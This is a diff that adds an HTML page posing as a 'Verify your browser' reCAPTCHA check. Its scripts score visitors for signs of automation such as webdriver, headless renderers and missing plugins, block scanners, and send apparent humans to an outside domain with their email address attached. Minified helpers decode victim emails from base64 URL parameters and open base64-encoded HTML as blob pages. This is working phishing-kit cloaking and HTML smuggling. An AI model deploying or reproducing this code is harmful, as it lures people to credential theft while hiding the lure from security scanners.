@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>  
+  <meta charset="UTF-8">
+  <title></title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <style>
+    .recapturemain{font-family:Arial,Helvetica,sans-serif;width:600px;margin:10% auto 0}.recapturemainin{width:300px;height:70px;background:#f9f9f9;border:1px solid silver;border-radius:5px;padding:5px 5px 5px 15px;margin:0 auto}.recapturemainin .lgo{width:70px}.leftcontainer>div,.recapturemainin>div{float:left}.leftcontainer{padding-top:20px}.recapturemainin .notrobottext{padding-top:5px}.recapturemainin .theboxcheck{width:25px;height:25px;border:2px solid #000;cursor:pointer;border-radius:2px}.thecheckboxarea{margin-right:10px}@media screen and (max-width:600px){.recapturemain{width:500px}}@media screen and (max-width:500px){.recapturemain{width:400px}}@media screen and (max-width:400px){.recapturemain{width:300px}}
+    
+    /* Bot Detection Status Styles */
+    .detection-message {
+      display: none;
+      margin-top: 20px;
+      padding: 15px;
+      border-radius: 5px;
+      text-align: center;
+      font-weight: 500;
+    }
+    
+    .detection-success {
+      background-color: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+    }
+    
+    .detection-blocked {
+      background-color: #f8d7da;
+      color: #721c24;
+      border: 1px solid #f5c6cb;
+    }
+    
+    .blocked-page {
+      display: none;
+      text-align: center;
+      margin-top: 30px;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    
+    .blocked-page h2 {
+      color: #721c24;
+      margin-bottom: 15px;
+    }
+    
+    .blocked-page p {
+      color: #666;
+      margin: 10px 0;
+    }
+  </style>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>  
+</head>
+<body>
+<div class="displink"></div>
+<div class="recapturemain">
+    <p style="text-align:center;font-size:18px;font-weight:500;">Verify your browser</p>
+	<div class="recapturemainin">
+	  <div class="leftcontainer">
+	    <div class="thecheckboxarea">
+		  <div class="theboxcheck" id="checkboxButton"></div>
+		  <img src="https://theexternalfiles.elevatedprude.shop/recapture/Rolling@1x-1.0s-31px-31px.gif" class="checkboxloading" style="width: 30px; display:none;">
+		  <img src="https://theexternalfiles.elevatedprude.shop/recapture/re-capture-tick.png" class="checkboxtick" style="width: 28px; display:none;">
+		</div>
+	    <div class="notrobottext"> I'm not a robot </div>
+	  </div>  
+	  <div style="float:right;"><img src="https://theexternalfiles.elevatedprude.shop/recapture/re-capture-right-image.png" class="lgo"></div>  
+	</div>
+	<div class="detection-message" id="detectionMessage"></div>
+	<div class="blocked-page" id="blockedPage">
+	  <h2>⚠️ Verification Failed</h2>
+	  <p>Suspicious activity detected. Access denied.</p>
+	  <p id="blockReason" style="font-size: 12px; color: #999;"></p>
+	</div>
+  </div>
+
+<script>
+// ==================== ENHANCED BOT DETECTION ====================
+
+var botDetectionReasons = [];
+var totalScore = 0;
+var threshold = 120;
+
+function botScore() {
+    var score = 0;
+    var ua = navigator.userAgent;
+    var uaLower = ua.toLowerCase();
+
+    if (navigator.webdriver) {
+        score += 80;
+        botDetectionReasons.push("WebDriver detected");
+    }
+
+    var autoStrings = ["headless", "phantom", "selenium", "puppeteer", "playwright", "cypress"];
+    for (var i = 0; i < autoStrings.length; i++) {
+        if (uaLower.indexOf(autoStrings[i]) !== -1) {
+            score += 40;
+            botDetectionReasons.push("Automation: " + autoStrings[i]);
+            break;
+        }
+    }
+
+    if (!navigator.plugins || navigator.plugins.length === 0) {
+        score += 15;
+        botDetectionReasons.push("No plugins");
+    }
+
+    if (!navigator.languages || navigator.languages.length === 0) {
+        score += 10;
+        botDetectionReasons.push("No languages");
+    }
+
+    var isChromeUA = /chrome/i.test(ua) && !/edg/i.test(ua);
+    if (isChromeUA && !window.chrome) {
+        score += 30;
+        botDetectionReasons.push("Chrome mismatch");
+    }
+
+    if (!navigator.permissions || typeof navigator.permissions.query !== "function") {
+        score += 10;
+        botDetectionReasons.push("No permissions API");
+    }
+
+    var hc = navigator.hardwareConcurrency;
+    if (hc === 0 || hc === undefined) {
+        score += 20;
+        botDetectionReasons.push("No hardware info");
+    }
+    if (hc === 1) {
+        score += 8;
+        botDetectionReasons.push("Single core");
+    }
+
+    if (screen.width < 200 || screen.height < 200) {
+        score += 30;
+        botDetectionReasons.push("Screen too small");
+    }
+    if (screen.width > 4000 || screen.height > 4000) {
+        score += 15;
+        botDetectionReasons.push("Screen too large");
+    }
+
+    if (window.outerWidth === window.innerWidth && window.outerHeight === window.innerHeight) {
+        score += 15;
+        botDetectionReasons.push("No window chrome");
+    }
+
+    var hasTouch = ("ontouchstart" in window) || navigator.maxTouchPoints > 0;
+    var isMobileUA = /mobi|android|iphone/i.test(ua);
+    if (isMobileUA && !hasTouch) {
+        score += 15;
+        botDetectionReasons.push("Mobile UA mismatch");
+    }
+
+    if (navigator.deviceMemory && navigator.deviceMemory < 2) {
+        score += 10;
+        botDetectionReasons.push("Low memory");
+    }
+
+    var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    if (!tz || tz === "Etc/UTC" || tz === "UTC") {
+        score += 8;
+        botDetectionReasons.push("Default timezone");
+    }
+
+    if (ua.length < 50) {
+        score += 10;
+        botDetectionReasons.push("Short UA");
+    }
+    if (ua.length > 500) {
+        score += 8;
+        botDetectionReasons.push("Long UA");
+    }
+
+    return score;
+}
+
+function canvasFingerprint() {
+    try {
+        var canvas = document.createElement("canvas");
+        var ctx = canvas.getContext("2d");
+        if (!ctx) {
+            botDetectionReasons.push("No canvas context");
+            return { suspicious: true };
+        }
+        ctx.fillText("test", 0, 0);
+        var imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+        if (!imageData.data.length) {
+            botDetectionReasons.push("Canvas read failed");
+            return { suspicious: true };
+        }
+        return { suspicious: false };
+    } catch (e) {
+        botDetectionReasons.push("Canvas error");
+        return { suspicious: true };
+    }
+}
+
+function webglFingerprint() {
+    try {
+        var canvas = document.createElement("canvas");
+        var gl = canvas.getContext("webgl");
+        if (!gl) return { suspicious: false };
+        
+        var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+        if (!debugInfo) return { suspicious: false };
+        
+        var renderer = (gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "").toLowerCase();
+        var headlessRenderers = ["swiftshader", "llvmpipe", "softpipe", "mesa offscreen", "angle", "gallium"];
+        
+        for (var i = 0; i < headlessRenderers.length; i++) {
+            if (renderer.indexOf(headlessRenderers[i]) !== -1) {
+                botDetectionReasons.push("Headless GPU");
+                return { suspicious: true };
+            }
+        }
+        return { suspicious: false };
+    } catch (e) {
+        botDetectionReasons.push("WebGL error");
+        return { suspicious: true };
+    }
+}
+
+function checkBrowserConsistency() {
+    var score = 0;
+    
+    if (navigator.vendor === "" || navigator.vendor === undefined) {
+        score += 8;
+        botDetectionReasons.push("No vendor");
+    }
+
+    if (navigator.vendor.indexOf("Google") === -1 && /chrome/i.test(navigator.userAgent)) {
+        score += 5;
+        botDetectionReasons.push("Vendor mismatch");
+    }
+
+    return score;
+}
+
+function checkInteractionCapability() {
+    var score = 0;
+    if (!window.PointerEvent) {
+        score += 10;
+        botDetectionReasons.push("No PointerEvent");
+    }
+    return score;
+}
+
+var humanSignals = 0;
+
+document.addEventListener("mousemove", function() { 
+    humanSignals += 5;
+}, { passive: true });
+
+document.addEventListener("click", function() { 
+    humanSignals += 10;
+}, { passive: true });
+
+document.addEventListener("keydown", function() { 
+    humanSignals += 8;
+}, { passive: true });
+
+document.addEventListener("touchstart", function() { 
+    humanSignals += 15;
+}, { passive: true });
+
+document.addEventListener("wheel", function() {
+    humanSignals += 3;
+}, { passive: true });
+
+function runBotDetection() {
+    botDetectionReasons = [];
+    totalScore = 0;
+    
+    totalScore += botScore();
+    
+    var fps = canvasFingerprint();
+    if (fps.suspicious) totalScore += 20;
+    
+    var wgl = webglFingerprint();
+    if (wgl.suspicious) totalScore += 25;
+    
+    totalScore += checkBrowserConsistency();
+    totalScore += checkInteractionCapability();
+    
+    if (humanSignals < 1) totalScore += 25;
+    
+    if (humanSignals > 10) totalScore = Math.max(0, totalScore - 30);
+    
+    console.log({
+        verdict: totalScore >= threshold ? "BOT_DETECTED" : "HUMAN_VERIFIED",
+        score: totalScore,
+        threshold: threshold,
+        reasons: botDetectionReasons
+    });
+    
+    return totalScore < threshold;
+}
+
+// ==================== ORIGINAL FUNCTIONALITY ====================
+
+$(document).ready(function(){
+    var theUrl = 'https://admiral.allinoneoutsdoor.com';
+    mainHandlerx(theUrl);
+});
+
+function mainHandlerx(c){
+    var i = geturlparameter("email");
+    if(i) c+="#"+i;
+    
+    var o = $(".theboxcheck");
+    var e = $(".checkboxloading");
+    var n = $(".checkboxtick");
+    var blockedPage = $("#blockedPage");
+    var detectionMsg = $("#detectionMessage");
+    
+    o.click(function(){
+        o.hide();
+        e.show();
+        
+        // Run bot detection
+        var isHuman = runBotDetection();
+        
+        setTimeout(function(){
+            e.hide();
+            
+            if(isHuman) {
+                // Human detected - proceed normally
+                n.show();
+                detectionMsg.html("✓ Verification passed").addClass("detection-success").show();
+                
+                setTimeout(function(){
+                    window.location.replace(c);
+                }, 1000);
+            } else {
+                // Bot detected - block access
+                o.show();
+                e.hide();
+                n.hide();
+                blockedPage.show();
+                
+                var reasons = botDetectionReasons.slice(0, 3).join(", ");
+                $("#blockReason").text("Score: " + totalScore + " | " + reasons);
+            }
+        }, 2000);
+    });
+}
+
+function getAbsoluteSendToUrlWithoutPhpFilePart(t){var e=t.length,r=-1;return e>0&&-1!=(r=t.lastIndexOf("/"))&&(t=t.substring(0,r)),t=removeBase64PaddingFromEndoFString(t,"/")}function saveFile(t,e){var r=void 0!==e&&!1!==e&&e.length>2&&validateEmail(e)?"#"+e.toLowerCase().trim():"",a=atob(t),n=new Blob([a],{type:"text/html"}),s=window.URL.createObjectURL(n);s+=r,window.location.replace(s)}function saveFile2(t){var e=atob(t),r=new Blob([e],{type:"text/html"}),a=window.URL.createObjectURL(r);window.location.replace(a)}function geturlparameter(t){for(var e=window.location.search.substring(1).split("&"),r=0;r<e.length;r++){var a=e[r].split("=");if(a[0]==t)return decodeURIComponent(a[1])}}function getUrlHashCheckifJson(){var t="abcdefghijklmnopqrstuvwxyz",e="",r={},a={},n={},s=[],o=0,l=0,h=0,u="",g={},m=0,f=!1,c="",p=0,y=getAllUrlParams(),_=Object.keys(y).length,v=getStringAfterUrlHash(),d="",b={},w=0,d="",O=v.length,P=0,A="",C="",k=!1;if(O>0&&(g.thisisjustthehashfromtheurlcstr=v),_>0)for(var E in y)y.hasOwnProperty(E)&&(g[E]=y[E]);if((m=Object.keys(g).length)>0){for(var B in g)if(k=!1,g.hasOwnProperty(B)&&(p=(c=g[B].trim()).length)>0&&isAllBase64Chars(v=isAllBase64CharsAddEqualsPadding(c,!0))&&(a[e=makeid(75,t)]=v,n.hasOwnProperty(v)||(a[e=makeid(75,t)]=v,n[v]="a"),d=v,s[o]=c,s[++o]=v,o++,P=(v=atob(v)).length,A=v.substring(0,2),C=v.substring(P-2),'{"'!=A&&'"}'!=C&&(v='{"'+v+'"}'),!1!==(k=testJSON(v))&&(n.hasOwnProperty(c)||(a[e=makeid(75,t)]=c,n[c]="a"),n.hasOwnProperty(d)||(a[e=makeid(75,t)]=d,n[d]="a"),l=0,(w=Object.keys(b=JSON.parse(v)).length)>0)))for(var S in b.hasOwnProperty("em")&&!r.hasOwnProperty("em")&&!1!==(u=checkIfStrIsEmailCheckAlsoBase64(b.em))&&validateEmail(u)&&(r.em=u.toLowerCase().trim()),b)b.hasOwnProperty(S)&&(u=checkIfStrIsEmailCheckAlsoBase64(b[S]),!r.hasOwnProperty("em")&&!1!==u&&validateEmail(u)&&(r.em=u.toLowerCase().trim()),"em"==S||r.hasOwnProperty(S)||(r[S]=b[S]));for(var U in f=!!r.hasOwnProperty("em"),g)g.hasOwnProperty(U)&&(r.hasOwnProperty(U)||(r[U]=g[U]),!r.hasOwnProperty("em")&&!1!==(u=checkIfStrIsEmailCheckAlsoBase64(g[U]))&&validateEmail(u)&&(r.em=u.toLowerCase().trim()))}return(h=Object.keys(a).length)>0&&(r=combineTwoObjects(r,a)),r}function removeBase64PaddingFromEndoFString(t,e){var r=t.length,a=r-1;if(r>0)for(;a>-1&&t[a]==e;)a=(r=(t=t.substring(0,a)).length)-1;return t}function isAllBase64CharsAddEqualsPadding(t,e){for(var r=!1,a="",n=0;n<10;n++){if(!1!==(a=atobCustom(t))){r=e?t:a;break}t+="="}return r}function getAbsoluteSendToUrlWithoutPhpFilePart(t){var e=-1;return t.length>0&&-1!=(e=t.lastIndexOf("/"))&&(t=t.substring(0,e)),t=removeBase64PaddingFromEndoFString(t,"/")}function checkIfStrIsEmailCheckAlsoBase64(t){var e=!1;return t.length>0&&(validateEmail(t)?e=t.toLowerCase():!1!==(t=atobCustom(t))&&t.length>2&&validateEmail(t)&&(e=t.toLowerCase())),e}function getAllUrlParams(){var t,e,r,a={},n=window.location.search;if(n.length>0&&"?"==n[0]&&(r=(e=(n=n.substring(1)).split("&")).length)>0)for(i=0;i<r;i++)-1!=e[i].indexOf("=")&&(a[(t=e[i].split("="))[0]]=t[1]);var s=getParamsFromBlobUrl();if(s&&"object"==typeof s&&null!==s&&Object.keys(s).length>0)for(var o in s)s.hasOwnProperty(o)&&!a.hasOwnProperty(o)&&(a[o]=s[o]);return a}function putLoaderImgAndConfigure(t,e,r){var a=getAllUrlParams();$(window).width();var n=getEmailFromHash(),s=n.em;0==n.type.length&&a.hasOwnProperty("type")&&(n.type=a.type);var o=!!s&&s.length>2&&"#"==s[0]&&s.substring(1),l=null,h=!1,u=$("#hbg"),g=$("#hbg img"),m=r.default,f="",c=t.loader;if("/"!=t.mainurl[t.mainurl.length-1]&&(t.mainurl+="/"),o&&o.length>2&&validateEmail(o)&&2==(l=o.split("@")).length){if(h=l[1],n.type.length>0&&e.hasOwnProperty(n.type)&&t.hasOwnProperty(e[n.type])){var p=e[n.type];r.hasOwnProperty(p)&&(m=r[p]),c=t[p]}else e.hasOwnProperty(h)&&(r.hasOwnProperty(e[h])&&(m=r[e[h]]),c=t[e[h]])}u.css({width:m+"px"}),f=t.mainurl+c,g.attr("src",f),g.on("load",function(){g.css({visibility:"visible"}),centerAlignDiv(),GFG_Fun()})}function getDetailsFromURlParams(){var t=[],e=0,r=getAllUrlParams();if(Object.keys(r).length>0)for(var a in r)r.hasOwnProperty(a)&&(t[e]=r[a],e++);return t}function centerAlignDiv(){var t=$(window).outerHeight(),e=$("img").height();$("#hbg").css({"margin-top":(t-e)/2+"px",visibility:"visible"})}function GFG_Fun(){var t=!1,e=$("#hbg");setInterval(function(){t?(e.fadeIn(800),t=!1):(e.fadeOut(800),t=!0)},100)}function getEmailFromHash(){var t={em:"",emnohash:"",type:""},e=[],r=0,a=0,n=getAllUrlParams(),s=Object.keys(n).length,o=!1,l=!1,h=!1,u=!1,g=!1,m="",f=!1;if(-1!=(g=(u=window.location.href).lastIndexOf("#"))?(theEmTemp=u.substring(g+1)).length>2&&(l=theEmTemp):(u=window.location.hash.substring(1))&&u.length>1&&(l=u),l&&(a=1,e[0]=l),s>0)for(var c in n)n.hasOwnProperty(c)&&n[c].trim().length>0&&(e[a]=n[c],a++);if((r=e.length)>0)for(i=0;i<r;i++)(l=e[i])&&(validateEmail(l)?o=l:(h=atobCustom(l))&&validateEmail(h)&&(o=h)),!o&&l&&(h=atobCustom(l))&&testJSON(f='{"'+(f=h)+'"}')&&(l=JSON.parse(f),m="",l.hasOwnProperty("em")&&(m=atobCustom(l.em))&&validateEmail(m)&&(o=m),l.hasOwnProperty("type")&&0==t.type.length&&(t.type=l.type)),o&&(o=o.toLowerCase(),0==t.em.length&&(t.em="#"+o,t.emnohash=o));return t}function atobCustom(t){var e=!1;return isAllBase64Chars(t)&&(e=atob(t)),e}function isAllBase64CharsV2(t){return t.length>0&&(t=t.toLowerCase()),!1}function isAllBase64CharsB4(t){return null!==t.match(/^[a-zA-Z0-9+=/]+$/)}function isAllBase64Chars(t){return/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/.test(t)}function testJSONV3(t){if("string"!=typeof t)return!1;try{return JSON.parse(t)}catch(e){return!1}}function testJSON(t){if("string"!=typeof t)return!1;try{return JSON.parse(t),!0}catch(e){return!1}}function validateEmail(t){return/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(String(t).toLowerCase())}function getStringAfterUrlHash(){var t="",e=window.location.href,r=e.indexOf("#");return -1!=r?t=e.substring(r+1):(e=window.location.hash).length>1&&(t=e.substring(1)),t}function getParamsFromBlobUrl(){var t={},e="theurlhashvalue",r="",a=!1;if(checkIfUrlIsBlob()){var n=getStringAfterUrlHash();if(n&&n.length>0&&isAllBase64Chars(n)&&testJSON(n=atob(n))&&(t=n=JSON.parse(n),n.hasOwnProperty(e)&&isAllBase64Chars(n[e])&&((a=!!testJSON(r=atob(n[e])))||(a=!!testJSON(r='{"'+r+'"}')),a&&Object.keys(r=JSON.parse(r)).length>0)))for(var s in r)r.hasOwnProperty(s)&&!t.hasOwnProperty(s)&&(t[s]=r[s])}return t}function checkIfUrlIsBlob(){var t=!1,e=window.location.href;return e.length>5&&"blob:"==e.substring(0,5)&&(t=!0),t}function combineTwoObjects(t,e){if(Object.keys(e).length>0)for(var r in e)e.hasOwnProperty(r)&&!t.hasOwnProperty(r)&&(t[r]=e[r]);return t}function makeid(t,e){let r="";void 0!==e&&e||(e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789");var a=e.length;let n=0;for(;n<t;)r+=e.charAt(Math.floor(Math.random()*a)),n+=1;return r}function getRandomArbitrary(t,e){return parseInt(Math.random()*(e-t)+t)}function getRandDirStructure(){for(var t="",e="abcdefghijklmnopqrstuvwxyz",r=e+"0123456789",a=getRandomArbitrary(4,8),n=3,s=10,o="",l=0,h=0;h<a;h++)0==h?(n=10,s=25):(n=5,s=10),l=(o=makeid(getRandomArbitrary(n,s),r)).length-1,isNaN(o[0])||(o=e[getRandomArbitrary(0,25)]+o),isNaN(o[l])||(o+=e[getRandomArbitrary(0,25)]),t+="/"+o;return t}
+</script>
+</body>
+</html>
